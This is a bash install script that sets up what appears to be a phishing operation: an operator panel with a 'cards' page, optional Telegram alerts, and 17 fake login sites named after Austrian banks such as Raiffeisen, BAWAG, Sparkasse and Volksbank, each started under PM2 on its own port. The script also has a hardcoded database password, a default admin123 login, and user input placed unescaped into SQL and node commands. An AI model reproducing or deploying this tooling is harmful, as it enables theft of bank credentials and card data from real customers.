#!/bin/bash
# ============================================================
# SHSH Panel — Interactive Setup (run ONCE on a fresh server)
# Ubuntu 24.04 LTS only. Must be root.
# ============================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
LOG="/tmp/shsh-setup.log"
> "$LOG"

log() { echo "[$(date '+%H:%M:%S')] $1" >> "$LOG"; }
info() { echo -e "${CYAN}[*]${NC} $1"; log "$1"; }
ok() { echo -e "${GREEN}[+]${NC} $1"; log "[OK] $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; log "[WARN] $1"; }
die() { echo -e "${RED}[FAIL]${NC} $1"; log "[FAIL] $1"; echo ""; echo "Full log: cat $LOG"; exit 1; }

# ============================================================
# PRE-FLIGHT CHECKS
# ============================================================
echo ""
echo -e "${CYAN}========================================${NC}"
echo -e "${CYAN}   SHSH Panel — Setup Wizard${NC}"
echo -e "${CYAN}========================================${NC}"
echo ""

# Root check
[ "$(id -u)" -ne 0 ] && die "This script must be run as root. Use: sudo bash setup.sh"

# Ubuntu check
if [ -f /etc/os-release ]; then
  . /etc/os-release
  info "OS detected: $PRETTY_NAME"
else
  warn "Cannot detect OS. Proceeding anyway..."
fi

# Check project files exist
[ ! -f "$SCRIPT_DIR/shsh-panel/package.json" ] && die "shsh-panel not found. Make sure you're running from the project root directory."
[ ! -d "$SCRIPT_DIR/banks" ] && die "banks/ directory not found."
[ ! -f "$SCRIPT_DIR/database/shsh_panel_final.dump" ] && die "Database dump not found at database/shsh_panel_final.dump"

ok "Project files found"

# ============================================================
# INTERACTIVE CONFIGURATION
# ============================================================
echo ""
echo -e "${YELLOW}--- Configuration ---${NC}"
echo ""

# Server IP
DEFAULT_IP=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || curl -s --max-time 5 api.ipify.org 2>/dev/null || hostname -I | awk '{print $1}')
read -p "Server IP address [$DEFAULT_IP]: " SERVER_IP
SERVER_IP=${SERVER_IP:-$DEFAULT_IP}
[ -z "$SERVER_IP" ] && die "Server IP is required"
ok "Server IP: $SERVER_IP"

# Admin password
echo ""
read -s -p "Admin panel password (default: admin123): " ADMIN_PASS
echo ""
ADMIN_PASS=${ADMIN_PASS:-admin123}
ok "Admin password set"

# Admin username
read -p "Admin username (default: admin): " ADMIN_USER
ADMIN_USER=${ADMIN_USER:-admin}
ok "Admin user: $ADMIN_USER"

# Telegram (optional)
echo ""
read -p "Telegram Bot Token (leave empty to skip): " TG_TOKEN
if [ -n "$TG_TOKEN" ]; then
  read -p "Telegram Chat ID: " TG_CHAT
  ok "Telegram configured"
else
  TG_CHAT=""
  info "Telegram skipped (you can set it up later in Settings)"
fi

# Confirm
echo ""
echo -e "${YELLOW}--- Review ---${NC}"
echo "  Server IP:      $SERVER_IP"
echo "  Admin user:     $ADMIN_USER"
echo "  Admin password:  ********"
echo "  Telegram:       $([ -n "$TG_TOKEN" ] && echo "Configured" || echo "Skipped")"
echo ""
read -p "Proceed with installation? (y/N): " CONFIRM
[ "$CONFIRM" != "y" ] && [ "$CONFIRM" != "Y" ] && die "Aborted by user"

echo ""
info "Starting installation... (full log: $LOG)"
echo ""

# ============================================================
# 1. SYSTEM PACKAGES
# ============================================================
info "[1/10] Installing system packages..."
export DEBIAN_FRONTEND=noninteractive
apt update -y >> "$LOG" 2>&1 || die "apt update failed"
apt install -y nginx postgresql postgresql-contrib curl git openssl unzip >> "$LOG" 2>&1 || die "apt install failed"
ok "System packages installed"

# ============================================================
# 2. NODE.JS
# ============================================================
info "[2/10] Installing Node.js..."
if ! command -v node &>/dev/null; then
  curl -fsSL https://deb.nodesource.com/setup_22.x 2>>"$LOG" | bash - >> "$LOG" 2>&1
  apt install -y nodejs >> "$LOG" 2>&1 || die "Node.js install failed"
else
  info "Node.js already installed: $(node -v)"
fi
npm install -g pm2 >> "$LOG" 2>&1
ok "Node.js $(node -v) + PM2 $(pm2 -v 2>/dev/null || echo '?')"

# ============================================================
# 3. POSTGRESQL
# ============================================================
info "[3/10] Setting up PostgreSQL..."
systemctl start postgresql >> "$LOG" 2>&1
systemctl enable postgresql >> "$LOG" 2>&1
sudo -u postgres psql -c "CREATE USER shsh WITH PASSWORD 'shsh_secure_2024';" >> "$LOG" 2>&1 || true
sudo -u postgres psql -c "CREATE DATABASE shsh_panel OWNER shsh;" >> "$LOG" 2>&1 || true
sudo -u postgres psql -c "GRANT ALL PRIVILEGES ON DATABASE shsh_panel TO shsh;" >> "$LOG" 2>&1 || true
sudo -u postgres psql -c "ALTER USER shsh CREATEDB;" >> "$LOG" 2>&1 || true
ok "PostgreSQL ready"

# ============================================================
# 4. RESTORE DATABASE
# ============================================================
info "[4/10] Restoring database..."
sudo -u postgres pg_restore --no-owner --no-acl --clean -d shsh_panel "$SCRIPT_DIR/database/shsh_panel_final.dump" >> "$LOG" 2>&1 || true
sudo -u postgres psql -d shsh_panel -c "GRANT ALL ON ALL TABLES IN SCHEMA public TO shsh; GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO shsh; GRANT USAGE ON SCHEMA public TO shsh;" >> "$LOG" 2>&1
ok "Database restored"

# ============================================================
# 5. COPY FILES
# ============================================================
info "[5/10] Copying project files to /opt/..."
rm -rf /opt/shsh-panel /opt/banks
cp -R "$SCRIPT_DIR/shsh-panel" /opt/shsh-panel
cp -R "$SCRIPT_DIR/banks" /opt/banks
ok "Files copied"

# ============================================================
# 6. ENVIRONMENT FILES
# ============================================================
info "[6/10] Writing .env files..."
NEXTAUTH_SECRET=$(openssl rand -hex 32)

cat > /opt/shsh-panel/.env << ENVEOF
DATABASE_URL="postgresql://shsh:shsh_secure_2024@localhost:5432/shsh_panel"
NEXTAUTH_SECRET="$NEXTAUTH_SECRET"
NEXTAUTH_URL="http://${SERVER_IP}:8500"
NEXT_PUBLIC_SITE_URL="http://${SERVER_IP}:3001"
ENVEOF

for dir in /opt/banks/*/; do
  echo "NEXT_PUBLIC_PANEL_URL=http://${SERVER_IP}:8500" > "$dir/.env"
done
ok ".env files created"

# ============================================================
# 7. INSTALL & BUILD
# ============================================================
info "[7/10] Installing dependencies & building (5-10 min)..."

info "  Panel..."
cd /opt/shsh-panel
npm install --production=false >> "$LOG" 2>&1 || die "Panel npm install failed. Check: cat $LOG"
npx prisma generate >> "$LOG" 2>&1 || die "Prisma generate failed"
npm run build >> "$LOG" 2>&1 || die "Panel build failed"
ok "  Panel built"

info "  Site..."
cd /opt/shsh-panel/site
npm install >> "$LOG" 2>&1 || die "Site npm install failed"
npm run build >> "$LOG" 2>&1 || die "Site build failed"
ok "  Site built"

info "  Banks (17 total)..."
FAIL_COUNT=0
for dir in /opt/banks/*/; do
  bank=$(basename "$dir")
  cd "$dir"
  npm install >> "$LOG" 2>&1 && npm run build >> "$LOG" 2>&1
  if [ $? -eq 0 ]; then
    echo -e "    ${GREEN}✓${NC} $bank"
  else
    echo -e "    ${RED}✗${NC} $bank (check log)"
    FAIL_COUNT=$((FAIL_COUNT + 1))
  fi
done
[ $FAIL_COUNT -eq 0 ] && ok "All 17 banks built" || warn "$FAIL_COUNT bank(s) failed"

# ============================================================
# 8. SET ADMIN PASSWORD
# ============================================================
info "[8/10] Setting admin credentials..."
cd /opt/shsh-panel
HASH=$(node -e "const b=require('bcryptjs');b.hash('$ADMIN_PASS',12).then(h=>console.log(h))" 2>>"$LOG")
if [ -n "$HASH" ]; then
  sudo -u postgres psql -d shsh_panel -c "UPDATE \"User\" SET username='$ADMIN_USER', password='$HASH' WHERE username='admin' OR id=(SELECT id FROM \"User\" LIMIT 1);" >> "$LOG" 2>&1
  ok "Admin credentials: $ADMIN_USER / ********"
else
  warn "Could not hash password. Default admin/admin123 will be used."
fi

# Set Telegram if provided
if [ -n "$TG_TOKEN" ] && [ -n "$TG_CHAT" ]; then
  sudo -u postgres psql -d shsh_panel -c "UPDATE \"Settings\" SET \"telegramBotToken\"='$TG_TOKEN', \"telegramChatId\"='$TG_CHAT';" >> "$LOG" 2>&1
  ok "Telegram configured in database"
fi

# ============================================================
# 9. PM2
# ============================================================
info "[9/10] Starting services with PM2..."
pm2 kill >> "$LOG" 2>&1 || true

cd /opt/shsh-panel && pm2 start npm --name panel -- start -- -p 8500 >> "$LOG" 2>&1
cd /opt/shsh-panel/site && pm2 start npm --name site -- start -- -p 3001 >> "$LOG" 2>&1
cd /opt/banks/vkb-login && pm2 start npm --name vkb -- start -- -p 3010 >> "$LOG" 2>&1
cd /opt/banks/oberbank-login && pm2 start npm --name oberbank -- start -- -p 3011 >> "$LOG" 2>&1
cd /opt/banks/bank99-login && pm2 start npm --name bank99 -- start -- -p 3012 >> "$LOG" 2>&1
cd /opt/banks/hypo-login && pm2 start npm --name hypo -- start -- -p 3013 >> "$LOG" 2>&1
cd /opt/banks/raiffeisen-login && pm2 start npm --name raiffeisen -- start -- -p 3014 >> "$LOG" 2>&1
cd /opt/banks/austria-next && pm2 start npm --name bank-austria -- start -- -p 3015 >> "$LOG" 2>&1
cd /opt/banks/burgenland-next && pm2 start npm --name burgenland -- start -- -p 3016 >> "$LOG" 2>&1
cd /opt/banks/hypo-vorarlberg-next && pm2 start npm --name hypo-vorarlberg -- start -- -p 3017 >> "$LOG" 2>&1
cd /opt/banks/hyponoe-next && pm2 start npm --name hypo-noe -- start -- -p 3018 >> "$LOG" 2>&1
cd /opt/banks/hypotirol-next && pm2 start npm --name hypotirol -- start -- -p 3019 >> "$LOG" 2>&1
cd /opt/banks/mypaylife-next && pm2 start npm --name mypaylife -- start -- -p 3020 >> "$LOG" 2>&1
cd /opt/banks/poso-next && pm2 start npm --name poso -- start -- -p 3021 >> "$LOG" 2>&1
cd /opt/banks/volks-next && pm2 start npm --name volksbank -- start -- -p 3022 >> "$LOG" 2>&1
cd /opt/banks/bawag-next && pm2 start npm --name bawag -- start -- -p 3023 >> "$LOG" 2>&1
cd /opt/banks/easybank-next && pm2 start npm --name easybank -- start -- -p 3024 >> "$LOG" 2>&1
cd /opt/banks/sparkasse-next && pm2 start npm --name sparkasse -- start -- -p 3025 >> "$LOG" 2>&1
cd /opt/banks/bks-next && pm2 start npm --name bks -- start -- -p 3026 >> "$LOG" 2>&1

pm2 save >> "$LOG" 2>&1
pm2 startup -u root --hp /root >> "$LOG" 2>&1 || pm2 startup >> "$LOG" 2>&1 || true

ONLINE=$(pm2 list --no-color 2>/dev/null | grep -c "online")
ok "$ONLINE processes started"

# ============================================================
# 10. NGINX
# ============================================================
info "[10/10] Configuring Nginx..."
rm -f /etc/nginx/sites-enabled/default

if [ -f "$SCRIPT_DIR/configs/nginx/sites-enabled/shsh-panel" ]; then
  cp "$SCRIPT_DIR/configs/nginx/sites-enabled/shsh-panel" /etc/nginx/sites-enabled/shsh-panel
  sed -i "s/144.31.106.50/$SERVER_IP/g" /etc/nginx/sites-enabled/shsh-panel
  nginx -t >> "$LOG" 2>&1 && systemctl reload nginx >> "$LOG" 2>&1
  ok "Nginx configured"
else
  warn "Nginx config not found. Configure manually."
fi

# ============================================================
# HEALTH CHECK
# ============================================================
echo ""
info "Running health check..."
sleep 5

PANEL_STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "http://localhost:8500/login" 2>/dev/null)
SITE_STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "http://localhost:3001" 2>/dev/null)

[ "$PANEL_STATUS" = "200" ] && ok "Panel: OK (HTTP $PANEL_STATUS)" || warn "Panel: HTTP $PANEL_STATUS (may need a few seconds to start)"
[ "$SITE_STATUS" = "200" ] && ok "Site: OK (HTTP $SITE_STATUS)" || warn "Site: HTTP $SITE_STATUS (may need a few seconds to start)"

# ============================================================
# DONE
# ============================================================
echo ""
echo -e "${GREEN}================================================${NC}"
echo -e "${GREEN}   SETUP COMPLETE!${NC}"
echo -e "${GREEN}================================================${NC}"
echo ""
echo -e "  Panel:      ${CYAN}http://${SERVER_IP}:8500${NC}"
echo -e "  Operator:   ${CYAN}http://${SERVER_IP}:8500/operator${NC}"
echo -e "  Cards:      ${CYAN}http://${SERVER_IP}:8500/operator/cards${NC}"
echo -e "  Site:       ${CYAN}http://${SERVER_IP}:3001${NC}"
echo ""
echo -e "  Login:      ${YELLOW}${ADMIN_USER}${NC} / ${YELLOW}********${NC}"
echo ""
echo -e "  PM2:        pm2 list | pm2 logs"
echo -e "  Full log:   cat $LOG"
echo -e "${GREEN}================================================${NC}"
echo ""
